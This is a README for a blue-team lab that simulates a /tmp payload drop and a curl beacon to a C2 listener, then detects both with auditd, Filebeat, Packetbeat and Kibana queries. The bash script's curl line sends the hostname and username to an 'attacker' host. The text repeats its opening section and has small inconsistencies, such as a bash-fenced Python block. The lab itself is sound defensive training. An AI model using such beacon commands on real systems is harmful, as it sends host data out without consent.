# SIEM_Lab_c2
Blue Team IoC Hunt Lab
Here’s a clean, copy-pasteable **README.md** you can drop straight into your repo.

---

# Blue-Team IoC Hunt Lab: `/tmp` payload + `/beacon` C2

A small lab that simulates basic malware behavior and shows how to detect it with **Filebeat (auditd)** and **Packetbeat** in **Elastic/Kibana**.

## What this lab demonstrates

**Malware behaviors (simulated):**

1. Drops a file (payload) into `/tmp`
2. “Calls home” via `curl` to an attacker server at `/beacon?user=...`

**Blue-team detections:**

* Watch `/tmp` for file writes/attribute changes via **auditd** (ingested by Filebeat’s `auditd` module)
* Catch outbound HTTP requests to `/beacon` via **Packetbeat**

---

## Topology

```
[Victim VM]
  ├─ Filebeat (auditd module enabled)
  ├─ Packetbeat
  └─ Simulated malware script (bash)

[Attacker VM or Host]
  └─ Simple Python listener (captures /beacon requests)
```

> Single-host works too if you bind the listener on localhost and point the script to it.

---

## Why `/tmp`?

`/tmp` is world-writable, routinely used for transient data, and frequently abused by malware to stage payloads. Monitoring `/tmp` gives high signal for suspicious file creation, especially with odd names or unexpected executables.

---

## Repo structure

```
.
├─ scripts/
│  ├─ victim_malware_sim.sh
│  └─ attacker_listener.py
├─ beats/
│  ├─ filebeat-auditd-example.yml
│  └─ packetbeat-http-example.yml
└─ README.md
```

---

## Requirements

* Linux VM (Ubuntu/Debian tested)
* sudo privileges
* Elastic stack reachable (Kibana) or local output (you can also ship to Elasticsearch directly)
* `auditd` installed and running

---

## Setup

### 1) Attacker listener (Python)

On your attacker host:

```bash
Here’s a clean, copy-pasteable **README.md** you can drop straight into your repo.

---

# Blue-Team IoC Hunt Lab: `/tmp` payload + `/beacon` C2

A small lab that simulates basic malware behavior and shows how to detect it with **Filebeat (auditd)** and **Packetbeat** in **Elastic/Kibana**.

## What this lab demonstrates

**Malware behaviors (simulated):**

1. Drops a file (payload) into `/tmp`
2. “Calls home” via `curl` to an attacker server at `/beacon?user=...`

**Blue-team detections:**

* Watch `/tmp` for file writes/attribute changes via **auditd** (ingested by Filebeat’s `auditd` module)
* Catch outbound HTTP requests to `/beacon` via **Packetbeat**

---

## Topology

```
[Victim VM]
  ├─ Filebeat (auditd module enabled)
  ├─ Packetbeat
  └─ Simulated malware script (bash)

[Attacker VM or Host]
  └─ Simple Python listener (captures /beacon requests)
```

> Single-host works too if you bind the listener on localhost and point the script to it.

---

## Why `/tmp`?

`/tmp` is world-writable, routinely used for transient data, and frequently abused by malware to stage payloads. Monitoring `/tmp` gives high signal for suspicious file creation, especially with odd names or unexpected executables.

---

## Repo structure

```
.
├─ scripts/
│  ├─ victim_malware_sim.sh
│  └─ attacker_listener.py
├─ beats/
│  ├─ filebeat-auditd-example.yml
│  └─ packetbeat-http-example.yml
└─ README.md
```

---

## Requirements

* Linux VM (Ubuntu/Debian tested)
* sudo privileges
* Elastic stack reachable (Kibana) or local output (you can also ship to Elasticsearch directly)
* `auditd` installed and running

---

## Setup

### 1) Attacker listener (Python)

On your attacker host:

```bash
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
        def do_GET(self):
                print(f"GET {self.path} UA={self.headers.get('User-Agent')} FROM={self.client_address}")
                self.send_response(200);
                self.end_headers();
                self.wfile.write(b"OK")

HTTPServer(("0.0.0.0",8000), H).serve_forever()
```

This prints any `/beacon?...` hits to stdout on **port 8000**.

---

### 2) Victim “malware” simulator (bash)

On your victim host:

```bash
#!/bin/bash

#1) Drop an artifac in /tmp folder (mimics payload)
echo "benign payload$(date)" > /tmp/p4yl04d.txt
#Deliberately wrote the payload in a way distinguishable from the log

#2) Beacon to C2
ATTACKER="192.168.56.101:8000"
curl -v "http://$ATTACKER/beacon?host=$(hostname)&user=$(whoami)"
#uses -v flag to view the background processes

echo "Done." #end script
```

---

### 3) Install & enable auditd

```bash
sudo apt-get update
sudo apt-get install -y auditd audispd-plugins
sudo systemctl enable --now auditd
```

**Add an audit rule for `/tmp`:**

* **Temporary (runtime) rule:**

  ```bash
  sudo auditctl -w /tmp -p wa -k payload_drop
  ```

* **Persistent rule (survives reboot):**

  ```bash
  echo '-w /tmp -p wa -k payload_drop' | sudo tee /etc/audit/rules.d/payload_drop.rules
  sudo augenrules --load
  sudo systemctl restart auditd
  ```

> **What auditd does:** it’s the Linux Audit subsystem that logs security-relevant events (syscalls). The rule above says “watch `/tmp` for **w**rites and attribute changes (**a**), and tag those events with key `payload_drop`.”

---

### 4) Install Filebeat (with auditd module) & Packetbeat

Follow Elastic’s install instructions for your distro, then:

```bash
# Enable Filebeat auditd module
sudo filebeat modules enable auditd

sudo filebeat test config
sudo packetbeat test config

sudo systemctl enable --now filebeat
sudo systemctl enable --now packetbeat
```


```yaml
filebeat.modules:
  - module: auditd
    log:
      enabled: true

output.elasticsearch:
  hosts: ["http://<ELASTIC_HOST>:9200"]

setup.kibana:
  host: "<KIBANA_HOST>:5601"
```

`beats/packetbeat-http-example.yml`

```yaml
packetbeat.interfaces.device: any

packetbeat.protocols:
  - type: http
    ports: [80, 8000, 8080, 5601, 9200]

output.elasticsearch:
  hosts: ["http://<ELASTIC_HOST>:9200"]

setup.kibana:
  host: "<KIBANA_HOST>:5601"
```

Restart services after edits:

```bash
sudo systemctl restart filebeat packetbeat
```

---

## Kibana Hunting

### 1) Find the beacon request (Packetbeat)

**KQL:**

```kql
http.request.method: "GET" AND url.full: */beacon*
```

Good places to look:

* **Discover** (index: `packetbeat-*`)
* **HTTP dashboard** (from Packetbeat’s built-in dashboards, if setup)

Tip: If `url.full` isn’t populated, try:

```kql
url.path: "/beacon" OR http.request.body.content: *beacon*
```

### 2) Find the `/tmp` drop (Filebeat / auditd)

Common ECS mappings for the auditd module include `event.module: auditd` and `file.path`. Try:

```kql
event.module: "auditd" AND file.path: /tmp*
```

You can also pivot on the audit key:

```kql
event.module: "auditd" AND event.action: "written" AND labels.auditd.key: "payload_drop"
```

(Depending on version/mappings, the key label may appear under `labels.auditd.key`, `auditd.log.key`, or `tags`—use Discover to see actual fields and tweak.)

**Expected result:** You should see the weirdly named file in `/tmp` that the script created.

---

## End-to-end test

1. Start the **attacker listener** (`attacker_listener.py`) on port 8000
2. Run the **victim script** with `ATTACKER_IP` pointing to the listener
3. Check **Kibana → Discover**:

   * `packetbeat-*` with the `/beacon` KQL above
   * `filebeat-*` with the `/tmp` KQL above
4. Confirm:

   * One or more HTTP GETs to `/beacon`
   * File write events in `/tmp` with your odd payload filename

---

## IoCs in this lab

* **File drop location:** `/tmp` (unusual names, hidden dotfiles, newly created executables)
* **Beacon pattern:** HTTP GET to `/beacon` with parameters like `?user=<user>&host=<host>&pid=<pid>`

---

## Safety & ethics

This is an educational lab. Do **not** target networks or systems you don’t own or control. Keep it contained.

---

## Credits

Built to practice practical detection engineering: combining endpoint auditing with network telemetry to validate IoCs quickly.

ChatGPT for ideas, framework and troubleshooting

---

### Appendix: Quick commands reference

```bash
# audit rule (runtime)
sudo auditctl -w /tmp -p wa -k payload_drop

# audit rule (persistent)
echo '-w /tmp -p wa -k payload_drop' | sudo tee /etc/audit/rules.d/payload_drop.rules
sudo augenrules --load && sudo systemctl restart auditd

# KQL - network
http.request.method: "GET" AND url.full: */beacon*

# KQL - file
event.module: "auditd" AND file.path: /tmp*
```

---

